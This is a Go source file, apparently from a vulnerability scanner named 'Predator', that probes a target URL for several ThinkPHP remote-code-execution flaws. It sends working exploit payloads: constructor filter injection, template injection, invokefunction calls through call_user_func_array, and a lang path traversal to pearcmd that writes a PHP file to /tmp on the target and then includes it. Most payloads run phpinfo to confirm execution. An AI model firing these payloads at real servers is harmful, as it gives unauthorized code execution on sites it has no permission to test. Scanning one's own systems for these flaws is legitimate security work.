package thinkphp

import (
	"Predator/pkg/utils"
	"strings"
)

func Vuln(u string) (bool, string) {
	if req, err := utils.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=captcha"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&filter[]=phpinfo&method=GET&server[REQUEST_METHOD]=1", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=captcha"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&method=GET&filter[]=phpinfo&get[]=1", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=captcha"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=captcha", "POST", "s=1&_method=__construct&method&filter[]=phpinfo", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=captcha"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
		}
	}
	if req, err := utils.HttpRequset(u+"/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true, u + "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
		}
	}
	if req, err := utils.HttpRequset(u+"/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=print('test');?>+/tmp/predator.php", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "CONFIGURATION") && strings.Contains(req.Body, "PEAR.PHP") {
			if req1, err1 := utils.HttpRequset(u+"/public/index.php?lang=../../../../../../../../tmp/predator", "GET", "", false, nil); err1 == nil {
				if req1.StatusCode == 200 && strings.Contains(req1.Body, "test") {
					return true, "Lang RCE"
				}
			}
		}
	}
	return false, ""
}
